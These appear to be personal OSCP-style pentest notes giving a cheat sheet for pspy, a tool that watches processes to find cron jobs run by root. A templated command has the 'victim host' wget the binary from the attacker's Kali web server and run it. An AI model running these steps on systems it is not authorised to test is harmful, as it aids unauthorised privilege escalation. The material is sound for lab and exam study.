# 🐍 pspy Cheat Sheet – Detecting Root Cron Jobs / Periodic Processes (Without Sudo)

---

On attacker Kali

```
cd ~/Desktop/Tools && python -m http.server 80
```

On Victim Host
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:80/pspy64 -O pspy`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
chmod +x pspy
```

```
./pspy > pspy.log
```

---

## 3️⃣ Basic Usage

Run as normal user (no sudo required):

```
./pspy64
```

You’ll see output like:

2026/02/24 10:02:01 CMD: root /usr/local/bin/backup.sh  
2026/02/24 10:03:01 CMD: user /usr/bin/cronjob

Columns:

- Timestamp
- PID
- CMD (command being run)

---

## 4️⃣ Finding Periodic Root Jobs

1. Filter output for root:

```
./pspy64 | grep root
```

2. Watch for repeating commands over a few minutes.
3. Note the **filename or full path** of the executable/script being run by root.

> That filename is your answer.

---

## 5️⃣ Tips

- Let `pspy` run for a few cycles (depends on cron frequency).
- Can redirect output to a file:

```
./pspy64 > pspy.log  
```

grep root pspy.log

- Works on Docker, VMs, and restricted shells.